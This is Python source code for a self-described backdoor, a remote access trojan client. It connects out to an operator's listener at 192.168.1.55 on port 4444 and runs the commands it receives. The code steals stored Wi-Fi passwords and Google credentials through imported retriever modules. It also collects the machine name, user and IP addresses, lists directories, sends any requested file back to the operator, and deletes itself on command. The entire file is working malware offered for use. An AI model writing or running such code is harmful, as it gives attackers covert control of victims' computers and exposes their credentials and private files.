import socket 
import time
import sys
import os
import subprocess
import re
import wifikeyretriever
import googlekeyretriever

def BackDoor():
    IP_ADDRESS = '192.168.1.55'
    PORT_NUMBER = 4444

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    while True:
        try:
            sock.connect((IP_ADDRESS, PORT_NUMBER))
        except socket.error:
            print('Connection failed, trying again in 5 seconds...')
            time.sleep(5)
        else:
            print('Connection successful')
            break

    def sizeof(num):
        for unit in ['B', 'Kb', 'Mb', 'Gb', 'Tb', 'Pb']:
            if abs(num) < 1024.0:
                if abs(num - round(num)) < 0.0001:
                    return f"{int(num)} {unit}"
                else:
                    return f"{round(num, 1):g} {unit}"
            num /= 1024.0
        return f"{num:.1f} YiB"

    def receive_data(client_socket, binary=False):
        data = b''
        marker_eos = b'-EOS'
        marker_eof = b'-EOF'
        marker = marker_eof if binary else marker_eos
        while not data.endswith(marker):
            chunk = client_socket.recv(1024)
            if not chunk:
                break
            data += chunk
        if not binary and data.endswith(marker_eos):
            output = data[:-4].decode()
        elif binary and data.endswith(marker_eof):
            output = data[:-4]
        else:
            print('Message doesn\'t appear to be a string nor a file. Maybe an error occurred')
            output = None
        return output

    def send_data(sock, data):
        if data:
            try:
                if isinstance(data, str):
                    data += '-EOS'
                else:
                    data += b'-EOF'
                chunks = [data[i:i+1024] for i in range(0, len(data), 1024)]
                for chunk in chunks:
                    if isinstance(chunk, str):
                        chunk = chunk.encode()
                    print(chunk, ' While sending each one to the listener')
                    sock.send(chunk)
                print(f'Sent {sys.getsizeof(data)} bytes of data')
            except Exception as e:
                print('Message transferring error: ', e)

    while True:
        command = receive_data(sock)
        if command:
            print('command = ',command)
        syntax = (command.strip()).split(' ')
        if command.startswith('cd'):
            cdsyn = [command.strip()[:2]]
            if command.strip()[3:]:
                cdsyn.append(command.strip()[3:])

        if command.startswith('wkr'):
                retriever = wifikeyretriever.WifiKeyRetriever()
                if '-1' in command and '-2' in command:
                    send_data(sock, retriever.retrievecurrentnet() + '\n\n' + retriever.retrievenetkeys())
                elif '-1' in command:
                    send_data(sock, retriever.retrievecurrentnet())
                elif '-2' in command:
                    send_data(sock, retriever.retrievenetkeys())
                else:
                    send_data(sock, '--> Unknown error occured')

        elif command.startswith('gkr'):
            retriever = googlekeyretriever.GoogleKeyRetriever()
            send_data(sock, retriever.retrievekeys())

        elif command.strip() == 'info':
            machine_name = subprocess.check_output(['hostname']).decode().strip()
            user = subprocess.check_output(['whoami']).decode().strip().split('\\')[-1] # get only the username
            public_ip = subprocess.check_output(['nslookup', 'myip.opendns.com.', 'resolver1.opendns.com'], stderr=subprocess.DEVNULL).decode().split()[-1]

            output = subprocess.check_output(['ipconfig'], stderr=subprocess.DEVNULL).decode()
            pattern = r'Indirizzo IPv4[^:]*:\s*([0-9]+(?:\.[0-9]+){3})'
            matches = re.findall(pattern, output)
            local_ip = matches[-1] if matches else None

            output_str = machine_name + '|' + user + '|' + public_ip + '|' + local_ip
            send_data(sock, output_str)
        
        elif command.startswith('cd'):
            if len(cdsyn) == 1:
                send_data(sock, os.getcwd())
            elif len(cdsyn) == 2:
                outcome = True
                try:
                    os.chdir(cdsyn[1])
                    send_data(sock, f'Directory successfully changed to {cdsyn[1]}')
                except: outcome = False

                if outcome == False:
                    try:
                        entries = os.listdir()
                        name = cdsyn[1]
                        for entry in entries:
                            if name.endswith('...'):
                                name = name[:-3]
                            if name in entry:
                                match = entry
                        os.chdir(match)
                        send_data(sock, f'Directory successfully changed to {cdsyn[1]}')
                    except:
                        send_data(sock, 'Directory non-existent')
        
        elif command == 'dir':
            dirlist = ''
            entries = os.listdir()
            if entries:
                for entry in entries:
                    if os.path.isdir(entry):
                        if len(entry) > 35:
                            new_entry = entry[:32] + '...'
                            line = new_entry + ' '*(40 - len(new_entry)) + 'dir'
                            dirlist += ('\n    ' + line)
                        else:
                            line = entry + ' '*(40 - len(entry)) + 'dir'
                            dirlist += ('\n    ' + line)
                    elif os.path.isfile(entry):
                        if len(entry) > 35:
                            new_entry = entry[:32] + '...'
                            line = new_entry + ' '*(40 - len(new_entry)) + 'file' + ' '*3 + sizeof(os.path.getsize(entry))
                            dirlist += ('\n    ' + line)
                        else:
                            line = entry + ' '*(40 - len(entry)) + 'file' + ' '*3 + sizeof(os.path.getsize(entry))
                            dirlist += ('\n    ' + line)

                send_data(sock, dirlist)
            else:
                send_data(sock, 'Empty folder')

        elif command.startswith('download'):
            if os.path.isfile(syntax[1]):
                with open(syntax[1], 'rb') as f:
                    file_data = f.read()
                send_data(sock, file_data)
            else: send_data(sock, '--> File not found. Check syntax, working directory or available files')

        elif command.startswith('echo'):
            send_data(sock, command.replace('echo ', '').strip())
        
        elif command == 'eradicate':
            send_data(sock, 'Backdoor eradicated')
            os.remove(os.path.dirname(__file__))
            sys.exit()

        elif command.startswith('quit'):
            BackDoor()

        else:
            pass
BackDoor()